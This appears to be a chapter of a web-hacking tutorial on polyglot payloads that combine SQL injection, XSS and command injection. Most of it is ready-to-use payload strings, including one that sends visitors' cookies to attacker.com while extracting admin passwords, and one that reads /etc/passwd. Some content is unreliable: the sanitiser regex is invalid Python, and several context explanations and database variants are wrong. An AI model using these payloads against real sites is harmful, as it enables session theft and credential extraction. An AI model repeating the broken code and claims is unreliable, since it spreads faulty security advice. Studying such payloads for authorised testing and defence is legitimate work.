# 19 - Polyglot Payloads

## Overview

Polyglot payloads are single inputs that work across multiple vulnerability contexts simultaneously. This guide covers payloads that function as both SQL injection and XSS attacks, reducing the number of requests needed during testing.

## Understanding Polyglots

A polyglot payload exploits multiple vulnerabilities with a single string. In web security, this means one payload that triggers different vulnerabilities depending on context.

### Why Use Polyglots?

| Benefit         | Description                                |
| --------------- | ------------------------------------------ |
| **Efficiency**  | One request tests multiple vulnerabilities |
| **Obfuscation** | Harder for filters to detect intent        |
| **Coverage**    | Uncovers chained vulnerabilities           |
| **Real-world**  | Mirrors actual attack scenarios            |

## SQL Injection + XSS Polyglots

### Basic Polyglot

**Payload:**

```
'">><script>alert(1)</script>' OR '1'='1'--
```

**SQL Context:**

```sql
SELECT * FROM users WHERE name = ''">><script>alert(1)</script>' OR '1'='1'--'
-- Executes: OR '1'='1 (always true)
```

**HTML Context:**

```html
<div>
  '">>
  <script>
    alert(1)
  </script>
  ' OR '1'='1'--
</div>
-- Executes:
<script>
  alert(1)
</script>
```

### Context-Aware Polyglot

**Payload:**

```
'" onclick="alert(1)" OR 1=1--
```

**SQL Injection:**

```sql
WHERE field = ''" onclick="alert(1)" OR 1=1--'
-- Always true condition
```

**HTML Attribute:**

```html
<input value='" onclick="alert(1)" OR 1=1--' /> -- Clickable XSS
```

## Common Polyglot Patterns

### Pattern 1: Quote Escaping Chain

**Payload:**

```
'">><marquee onstart=alert(1)>' OR 1=1--
```

**Breakdown:**

- `'` - Escapes SQL string
- `">` - Escapes HTML attribute
- `>` - Closes HTML tag
- `<marquee onstart=alert(1)>` - XSS payload
- `'` - Opens SQL string again
- ` OR 1=1` - SQL injection
- `--` - SQL comment

### Pattern 2: JavaScript + SQL Combo

**Payload:**

```
';alert(1);' OR '1'='1'--
```

**JavaScript Context:**

```javascript
var x = '';alert(1);' OR '1'='1'--';
// Executes: alert(1)
```

**SQL Context:**

```sql
WHERE field = '';alert(1);' OR '1'='1'--'
-- Executes: OR '1'='1'
```

### Pattern 3: Image Tag + SQL

**Payload:**

```
'"/><img src=x onerror=alert(1)> OR 1=1--
```

**HTML Context:**

```html
<input value='"/><img src=x onerror=alert(1)> OR 1=1--' /> -- Image loads with XSS
```

**SQL Context:**

```sql
WHERE field = '"/><img src=x onerror=alert(1)> OR 1=1--'
-- Always true
```

## Advanced Polyglots

### Triple Context Polyglot (SQL + XSS + Command Injection)

**Payload:**

```
';alert(1);'; cat /etc/passwd; echo '
```

**SQL Context:**

```sql
WHERE field = '';alert(1);'; cat /etc/passwd; echo '';
-- Executes: alert(1) as string concat
```

**JavaScript Context:**

```javascript
var x = '';alert(1);'; cat /etc/passwd; echo '';
-- Executes: alert(1)
```

**Command Context:**

```bash
echo '';alert(1);'; cat /etc/passwd; echo '';
# Executes: cat /etc/passwd
```

### JSON Polyglot

**Payload:**

```json
{
  "name": "'\"><script>alert(1)</script>' OR 1=1--"
}
```

**Multiple Contexts:**

- JSON parser: Valid string
- SQL query: Injection payload
- HTML display: XSS payload

### XML Polyglot

**Payload:**

```xml
<user>'"/><script>alert(1)</script>' OR 1=1--</user>
```

**Multiple Contexts:**

- XML parser: Valid text
- SQL query: Injection payload
- HTML rendering: XSS payload

## Testing with Polyglots

### Methodology

**Step 1: Send Polyglot Payload**

```http
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query='"><script>alert(1)</script>' OR 1=1--
```

**Step 2: Observe Multiple Responses**

| Context       | Indicator                           |
| ------------- | ----------------------------------- |
| SQL Injection | Different result set, error message |
| XSS           | Alert popup, script execution       |
| HTML          | Rendered tags, styling changes      |

**Step 3: Confirm Vulnerabilities**

If polyglot triggers:

- Test SQL injection separately
- Test XSS separately
- Determine if chained exploitation possible

## Real-World Scenarios

### Scenario 1: Search Function

**Application:**

- Search box displays results on page
- Search term stored in database
- Search history shown to users

**Polyglot:**

```
'">><img src=x onerror=alert(1)> OR 1=1--
```

**Impact:**

1. SQL injection returns all results
2. XSS executes when other users view history
3. Stored XSS + SQL injection combo

### Scenario 2: Comment System

**Application:**

- User comments stored in database
- Comments displayed to all users
- Admin panel shows all comments

**Polyglot:**

```
'"/><script>fetch('https://attacker.com/?c='+document.cookie)</script>'
UNION SELECT username,password FROM admin--
```

**Impact:**

1. SQL injection extracts admin credentials
2. XSS steals session cookies
3. Data exfiltration to attacker server

### Scenario 3: Profile Update

**Application:**

- Profile fields saved to database
- Profile displayed on public pages
- Multiple output contexts

**Polyglot:**

```javascript
';alert(1);' OR 1=1;--
```

**Impact:**

1. SQL injection modifies other profiles
2. XSS executes when viewing profile
3. JavaScript injection if field used in JS

## Polyglot Variations by Database

### MySQL Polyglot

```
'">><script>alert(1)</script>' AND 1=1--
```

### PostgreSQL Polyglot

```
'">><script>alert(1)</script>' AND 1=1--
```

### MSSQL Polyglot

```
'">><script>alert(1)</script>' OR 1=1--
```

### Oracle Polyglot

```
'">><script>alert(1)</script>' OR 1=1 FROM DUAL--
```

## Detection and Prevention

### For Attackers: Identifying Polyglot Opportunities

**Check:**

- Input stored in database (SQL context)
- Input displayed on pages (HTML context)
- Input used in JavaScript (JS context)
- Input reflected in responses (XSS context)

**Opportunity Matrix:**

| Stored? | Displayed? | JavaScript? | Polyglot Potential |
| ------- | ---------- | ----------- | ------------------ |
| Yes     | Yes        | Yes         | **High**           |
| Yes     | Yes        | No          | Medium             |
| No      | Yes        | Yes         | Low (XSS only)     |
| Yes     | No         | Yes         | Low (SQL only)     |

### For Defenders: Preventing Polyglot Attacks

**Layer 1: Input Validation**

```python
import re

def sanitize_input(user_input):
    # Remove dangerous characters
    cleaned = re.sub(r'[<>'"";]', '', user_input)
    return cleaned
```

**Layer 2: Context-Specific Output Encoding**

```python
# HTML context
import html
html.escape(user_input)

# SQL context (use parameterized queries)
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))

# JavaScript context
json.dumps(user_input)
```

**Layer 3: Content Security Policy**

```http
Content-Security-Policy: default-src 'self'; script-src 'none'
```

## Practice Exercises

### Exercise 1: Basic Polyglot Detection

**Setup:**

- Application with search feature
- Results displayed on same page

**Task:**

1. Send SQL injection + XSS polyglot
2. Confirm both vulnerabilities trigger
3. Exploit chained vulnerability

**Payload:**

```
'">><script>alert(1)</script>' OR 1=1--
```

### Exercise 2: Stored XSS + SQL Injection

**Setup:**

- Comment system with database storage
- Comments visible to all users

**Task:**

1. Inject polyglot comment
2. Verify SQL injection works
3. Confirm XSS executes for other users

### Exercise 3: Triple Context Polyglot

**Setup:**

- Profile field used in multiple contexts

**Task:**

1. Craft payload for SQL + XSS + JS contexts
2. Test in each context
3. Maximize impact

## Key Takeaways

1. **Polyglots test multiple vulnerabilities** with one request
2. **Context matters** - Same payload works differently
3. **Stored XSS + SQL injection** = powerful combo
4. **Defense requires** context-aware encoding
5. **Efficiency gain** - Reduce testing requests significantly

## Next Steps

Continue to [20 - Multibyte Encoding Bypass](20-Multibyte-Encoding-Bypass.md) to learn about character set-based bypasses.
